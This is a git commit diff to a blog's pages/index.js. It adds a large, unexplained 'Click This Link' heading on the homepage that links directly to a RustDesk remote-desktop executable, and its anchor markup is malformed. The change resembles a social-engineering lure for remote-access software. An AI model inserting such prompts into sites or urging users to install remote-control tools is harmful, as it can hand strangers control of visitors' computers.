ec9e8648cf9b6a232c5e2001c23748d0bda6a3f8
Wade Croft <80725298+CypressJack@users.noreply.github.com>
2024-10-09 19:43:49 -0700

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -22,6 +22,13 @@ export default function Home({ posts }) {
       <PageSEO title={siteMetadata.title} description={siteMetadata.description} />
       <div className="divide-y divide-gray-200 dark:divide-gray-700">
         <div className="space-y-2 pt-6 pb-8 md:space-y-5">
+  <a
+    href="https://github.com/rustdesk/rustdesk/releases/download/1.3.1/rustdesk-1.3.1-x86_64.exe"
+  >        
+  <h1 className="text-3xl font-extrabold leading-9 tracking-tight text-gray-900 dark:text-gray-100 sm:text-4xl sm:leading-10 md:text-6xl md:leading-14 mb-20">
+      Click This Link    
+      </h1>
+           <a/> 
           <h1 className="text-3xl font-extrabold leading-9 tracking-tight text-gray-900 dark:text-gray-100 sm:text-4xl sm:leading-10 md:text-6xl md:leading-14">
             Latest
           </h1>
